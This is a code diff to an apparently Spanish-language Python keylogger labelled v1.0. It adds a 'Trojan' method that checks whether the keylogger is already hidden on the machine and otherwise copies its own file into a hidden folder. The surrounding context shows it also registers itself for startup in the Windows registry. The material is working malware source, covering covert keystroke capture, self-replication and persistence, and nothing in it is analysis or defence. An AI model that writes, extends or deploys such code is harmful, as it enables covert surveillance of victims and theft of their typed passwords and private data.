@@ -11,6 +11,7 @@
 #██████╔╝██║░░░░░░░░██║░░░░░░░██║░░░███████╗███████╗███████╗╚██████╔╝██║░░██║██║░░██║██║░╚═╝░██║░░░░░░
 #╚═════╝░╚═╝░░░░░░░░╚═╝░░░░░░░╚═╝░░░╚══════╝╚══════╝╚══════╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝░v1.0░
 import os
+import shutil
 import socket
 import string
 import time                             # Pausar script por segundos predeterminados
@@ -100,6 +101,19 @@ class Util:
                 registry = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)  # local
                 SetValueEx(registry, Config().NAME_REG, 0, REG_SZ, Config().PATH_KEY)
                 print("[StartUp] USER - EXITOSO")
+
+    def Trojan(self):   # Se Replica en el sistema
+        self.CreateFolders()
+        try:
+            with open(Config().PATH_KEY, 'r') as f:  # Verifica si el keylogger se encuentra oculto en el sistema
+                print("[Trojan] - Ya se encuentra en el sistema : \n" + Config().PATH_KEY)
+        except:
+            print("[Trojan] - No se encuentra en el sistema...\nProceso Troyano...")
+            try:
+                shutil.copy(Config().NAME_KEY, Config().PATH_KEY)  # Intenta ocultar el keylogger en una carpeta
+                print("\n[Trojan] - Se replico en el sistema correctamente")
+            except:
+                print("\n[Trojan] - Hubo un problema al replicar en el sistema")
 
     def CreateFolders(self):  # Crea el directorio oculto
         try:  # Intenta crear la dirección
